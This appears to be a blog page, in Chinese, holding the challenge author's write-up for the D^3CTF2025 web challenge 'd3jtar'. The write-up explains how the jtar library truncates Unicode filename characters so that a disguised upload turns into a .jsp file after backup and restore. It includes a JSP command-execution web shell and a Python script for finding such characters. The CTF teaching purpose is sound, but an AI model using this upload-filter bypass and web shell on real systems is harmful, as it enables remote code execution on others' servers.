@@ -1,0 +1,758 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/myavatar.jpg">
+  <link rel="icon" href="/img/myavatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="5i1encee">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="欢迎交流指点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D^3CTF2025 d3jtar 出题及 WP">
+<meta property="og:url" content="http://5i1encee.top/2025/06/02/D3CTF-d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/index.html">
+<meta property="og:site_name" content="5i1encee&#39;s Blog">
+<meta property="og:description" content="欢迎交流指点">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://5i1encee.top/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/D3CTF2025.png">
+<meta property="article:published_time" content="2025-06-02T13:30:37.000Z">
+<meta property="article:modified_time" content="2025-06-02T13:51:36.701Z">
+<meta property="article:author" content="5i1encee">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="出题">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://5i1encee.top/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/D3CTF2025.png">
+  
+  
+  
+  <title>D^3CTF2025 d3jtar 出题及 WP - 5i1encee&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"5i1encee.top","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"jjGGn76maTdishPRDEFNvls9-gzGzoHsz","app_key":"FJ9un1wEMLCu0LBShqweCwNF","server_url":"https://jjggn76m.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>5i1encee</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/D3CTF2025.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="D^3CTF2025 d3jtar 出题及 WP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        5i1encee
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-02 21:30" pubdate>
+          2025年6月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">D^3CTF2025 d3jtar 出题及 WP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="D-3CTF2025-d3jtar-出题及-WP"><a href="#D-3CTF2025-d3jtar-出题及-WP" class="headerlink" title="D^3CTF2025 d3jtar 出题及 WP"></a>D^3CTF2025 d3jtar 出题及 WP</h1><h1 id="阅前声明"><a href="#阅前声明" class="headerlink" title="阅前声明"></a>阅前声明</h1><p>本题由 <strong><a target="_blank" rel="noopener" href="https://github.com/luelueking">1ue</a>师傅</strong>提供关键思路！感谢<strong>协会大佬</strong>们的帮助！</p>
+<h1 id="d3jtar"><a href="#d3jtar" class="headerlink" title="d3jtar"></a>d3jtar</h1><p>jtar 是 java 中打 tar 包的常用库，它对文件名的处理存在一些问题，本题即围绕这一点在文件备份场景中展开，希望选手通过自行尝试、挖掘 jtar 工作细节来获取 flag。</p>
+<p>题中的网站文件备份系统的 view 路由下配置了不安全的 jsp 解析，显然只要成功上传 jsp 文件即可 RCE。然而后端对上传文件的名称做了较为严格的校验，理想情况下选手无法通过其他手段绕过 secureUpload 校验来上传 jsp 文件。</p>
+<p>那么结合题目名称，突破口就在于 jtar。我们来看一下 jtar 打包的工作流程：</p>
+<p>从 <a target="_blank" rel="noopener" href="https://github.com/kamranzafar/jtar">https://github.com/kamranzafar/jtar</a> 拉取源码，添加一个与题目基本一致的 Backup</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.kamranzafar.jtar;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.util.Collections;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Backup</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        tarDirectory(Path.of(<span class="hljs-string">&quot;1.tar&quot;</span>), Path.of(<span class="hljs-string">&quot;tmp/tar&quot;</span>));<br>        untar(Path.of(<span class="hljs-string">&quot;tmp/untar&quot;</span>), Path.of(<span class="hljs-string">&quot;1.tar&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tarDirectory</span><span class="hljs-params">(Path outputFile, Path inputDirectory)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        tarDirectory(outputFile, inputDirectory, Collections.emptyList());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tarDirectory</span><span class="hljs-params">(Path outputFile, Path inputDirectory, List&lt;String&gt; pathPrefixesToExclude)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// Output file stream</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(outputFile.toFile());<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Path</span> <span class="hljs-variable">outputFileAbsolute</span> <span class="hljs-operator">=</span> outputFile.normalize().toAbsolutePath();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Path</span> <span class="hljs-variable">inputDirectoryAbsolute</span> <span class="hljs-operator">=</span> inputDirectory.normalize().toAbsolutePath();<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">inputPathLength</span> <span class="hljs-operator">=</span> inputDirectoryAbsolute.toString().length();<br><br>        <span class="hljs-comment">// Create a TarOutputStream</span><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">TarOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TarOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(dest))) &#123;<br>            Files.walk(inputDirectoryAbsolute).forEach(entry -&gt; &#123;<br>                <span class="hljs-keyword">if</span> (Files.isDirectory(entry))<br>                    <span class="hljs-keyword">return</span>;<br><br>                <span class="hljs-comment">// Don&#x27;t try to compress the output.tar file into itself</span><br>                <span class="hljs-keyword">if</span> (entry.equals(outputFileAbsolute))<br>                    <span class="hljs-keyword">return</span>;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">relativeName</span> <span class="hljs-operator">=</span> entry.toString().substring(inputPathLength + <span class="hljs-number">1</span>);<br><br>                    out.putNextEntry(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TarEntry</span>(entry.toFile(), relativeName));<br>                    <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">origin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(entry.toFile()));<br>                    <span class="hljs-type">int</span> count;<br>                    <span class="hljs-type">byte</span> data[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br><br>                    <span class="hljs-keyword">while</span> ((count = origin.read(data)) != -<span class="hljs-number">1</span>) &#123;<br>                        out.write(data, <span class="hljs-number">0</span>, count);<br>                    &#125;<br><br>                    out.flush();<br>                    origin.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">untar</span><span class="hljs-params">(Path outputDirectory, Path inputTarFile)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(inputTarFile.toFile())) &#123;<br>            untar(outputDirectory, fileInputStream);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">untar</span><span class="hljs-params">(Path outputDirectory, InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">TarInputStream</span> <span class="hljs-variable">tarInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TarInputStream</span>(inputStream)) &#123;<br>            TarEntry entry;<br><br>            <span class="hljs-keyword">while</span> ((entry = tarInputStream.getNextEntry()) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">int</span> count;<br>                <span class="hljs-type">byte</span> data[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">32768</span>];<br>                <span class="hljs-type">File</span> <span class="hljs-variable">outputFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(outputDirectory + <span class="hljs-string">&quot;/&quot;</span> + entry.getName());<br>                <span class="hljs-keyword">if</span> (!outputFile.getParentFile().isDirectory())<br>                    outputFile.getParentFile().mkdirs();<br><br>                <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(outputFile);<br>                <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(fos);<br><br>                <span class="hljs-keyword">while</span> ((count = tarInputStream.read(data)) != -<span class="hljs-number">1</span>) &#123;<br>                    dest.write(data, <span class="hljs-number">0</span>, count);<br>                &#125;<br><br>                dest.flush();<br>                dest.close();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在 41 行 <code>out.putNextEntry(new TarEntry(entry.toFile(), relativeName));</code> 打下断点，并步入 <code>putNextEntry</code>，这里是在遍历压缩目录下所有文件时将每个文件的文件名等条目写入字节流。</p>
+<p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/RQE7bq7u0othz2xGrAzce3iKnLe.png" srcset="/img/loading.gif" lazyload></p>
+<p>随后步入 <code>entry.writeEntryHeader( header );</code></p>
+<p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/Nu43bWo5uo0olxxNoDIcMrrAnYg.png" srcset="/img/loading.gif" lazyload></p>
+<p>再步入 <code>offset = TarHeader.getNameBytes(header.name, outbuf, offset, TarHeader._NAMELEN_);</code>，<code>getNameBytes</code> 即是针对 <code>header</code> 中的文件名从 <code>StringBuffer</code> 向 <code>Bytes</code> 转换。</p>
+<p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/QSlnbDl6Toz1zxx3lDXcs51YnYf.png" srcset="/img/loading.gif" lazyload></p>
+<p>此处强制转换发生字符截断。</p>
+<p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/BLo8bnXrNoL1SmxTO7hc5QvJnkh.png" srcset="/img/loading.gif" lazyload></p>
+<p>后缀第一个字符为 2 字节的中文字符“剪”，抛弃高 8 位仅保留低 8 位，字符被截断为 ASCII 码 106 即 <code>j</code>，后两个字符同理。</p>
+<p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/HQWRbkexZojXSKxEWDucRzXanwh.png" srcset="/img/loading.gif" lazyload></p>
+<p>打包前及恢复后效果如图</p>
+<p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/Ty3pbUPBcohqIlx4L8scza7JnDf.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以，我们可以将后缀带有特定 unicode 字符的文件上传至靶机，绕过后缀黑名单检查，通过备份与恢复功能将上传的文件转变为 jsp 后缀的文件，最终 RCE 获取 flag。</p>
+<p>示例文件如下：</p>
+<p>文件名：payload.陪sp –&gt; payload.jsp</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;printenv&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(p.getInputStream()));<br>        String line;<br>        <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            output += line + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        output = <span class="hljs-string">&quot;Error executing command: &quot;</span> + e.getMessage();<br>    &#125;<br>%&gt;<br><br>&lt;html&gt;<br>&lt;head&gt;&lt;title&gt;Command Output&lt;/title&gt;&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;Executed Command: &lt;code&gt;&lt;%= cmd %&gt;&lt;/code&gt;&lt;/h2&gt;<br>&lt;pre&gt;&lt;%= output %&gt;&lt;/pre&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>解题所使用的 unicode 字符可以参考以下脚本获取，只要可以转换为正常后缀的 ASCII 字符即可，例如 <code>payload.멪ⅳば</code> 也是相同效果</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_search</span>(<span class="hljs-params">byte_value</span>):<br>    low_byte = byte_value &amp; <span class="hljs-number">0xFF</span><br>    candidates = []<br><br>    <span class="hljs-keyword">for</span> high <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span> + <span class="hljs-number">1</span>):<br>        code_point = (high &lt;&lt; <span class="hljs-number">8</span>) | low_byte<br>        <span class="hljs-keyword">try</span>:<br>            char = <span class="hljs-built_in">chr</span>(code_point)<br>            name = unicodedata.name(char)<br>            candidates.append((<span class="hljs-string">f&quot;U+<span class="hljs-subst">&#123;code_point:04X&#125;</span>&quot;</span>, char, name))<br>        <span class="hljs-keyword">except</span> ValueError:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span> candidates<br><br>ascii_character = <span class="hljs-string">&quot;j&quot;</span>  <span class="hljs-comment"># &quot;s&quot;,&quot;p&quot;</span><br>byte_val = <span class="hljs-built_in">ord</span>(ascii_character)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Possible original characters (<span class="hljs-subst">&#123;byte_val&#125;</span> → 0x<span class="hljs-subst">&#123;byte_val &amp; <span class="hljs-number">0xFF</span>:02X&#125;</span>）:&quot;</span>)<br>results = reverse_search(byte_val)<br><span class="hljs-keyword">for</span> cp, char, name <span class="hljs-keyword">in</span> results:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;cp&#125;</span>: <span class="hljs-subst">&#123;char&#125;</span> - <span class="hljs-subst">&#123;name&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>另外，其实选手如果有心注意的话，在 jtar 的 github 项目里有一条 23 年的 pr（最上方），是关于中文编码错误的修改（其实问题不止中文，例如“멪”或者其他特殊字符，这条 pr 并未被合并），那么这或许可以作为一条潜在的 hint，至少能提醒选手 jtar 的编码处理可能有些问题，找到挖掘利用点的方向。</p>
+<p>（<a target="_blank" rel="noopener" href="https://github.com/kamranzafar/jtar/pull/36/commits/0fc08d31fe4bf0b0fad2f5a2f3acb3f5c14858ac">https://github.com/kamranzafar/jtar/pull/36/commits/0fc08d31fe4bf0b0fad2f5a2f3acb3f5c14858ac</a>）</p>
+<p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/GGYVbXPANoVuAdxOLdXclOOxnEe.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="赛事结果"><a href="#赛事结果" class="headerlink" title="赛事结果"></a>赛事结果</h1><p>d3jtar 的最终解数为 13 解。好消息是没有出现非预期。😉</p>
+<p>在查看参赛队伍提交的 WP 时发现，有一支队伍（似乎当时并未发现可以绕过的根本原因）使用了略有不同的 payload，后缀为 <code>.jsp耀</code> –&gt; <code>.jsp</code>，当然本质原理是一样的，但刚好耀的 unicode 为 <code>\u8000</code>，截断后变为 <code>00</code></p>
+<p>如需复现，可至仓库 <a target="_blank" rel="noopener" href="https://github.com/5i1encee/D3CTF2025-d3jtar">https://github.com/5i1encee/D3CTF2025-d3jtar</a> 获取题目环境及附件</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+        <a href="/tags/WriteUp/" class="print-no-link">#WriteUp</a>
+      
+        <a href="/tags/%E5%87%BA%E9%A2%98/" class="print-no-link">#出题</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>D^3CTF2025 d3jtar 出题及 WP</div>
+      <div>http://5i1encee.top/2025/06/02/D3CTF-d3jtar出题及WP/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>5i1encee</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/15/Mini%20L-CTF/" title="Mini L-CTF">
+                        <span class="hidden-mobile">Mini L-CTF</span>
